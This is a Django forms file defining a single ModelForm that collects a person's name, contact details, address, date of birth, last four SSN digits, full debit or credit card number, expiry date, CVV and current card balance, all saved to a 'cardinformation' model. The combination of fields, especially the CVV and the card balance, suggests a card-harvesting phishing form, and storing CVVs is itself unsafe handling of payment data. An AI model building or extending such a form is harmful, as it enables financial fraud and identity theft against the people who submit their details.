from django import forms
from .models import cardinformation

from localflavor.us.models import USStateField
from localflavor.us.forms import USStateSelect
from django.contrib.auth.forms import AuthenticationForm


class cardandcashappmainform(forms.ModelForm):

	first_name = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "First Name"}))
	last_name = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Last Name"}))
	email = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Email"}))
	phone = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Phone Number"}))
	address = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Address"}))
	city = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "City"}))
	state = forms.CharField(widget=USStateSelect(attrs={"class":"form-control required", "placeholder": "USStateSelect"}))
	zip_code = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Zip Code"}))
	date_of_birth = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Your Date Of Birth"}))
	last_four_ssn= forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Last 4 Digit of SSN"}))
	card_numbers = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Debit/Credit Card Number"}))
	exp_date = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Exp Date"}))
	cvv = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "CVV"}))
	current_balance = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Balance In Card"}))


	class Meta:
		model = cardinformation
		fields = ('first_name', 'last_name', 'email', 'phone', 'address', 'city', 'state', 'zip_code', 'date_of_birth', 'last_four_ssn', 'current_balance', 'card_numbers', 'exp_date', 'cvv')

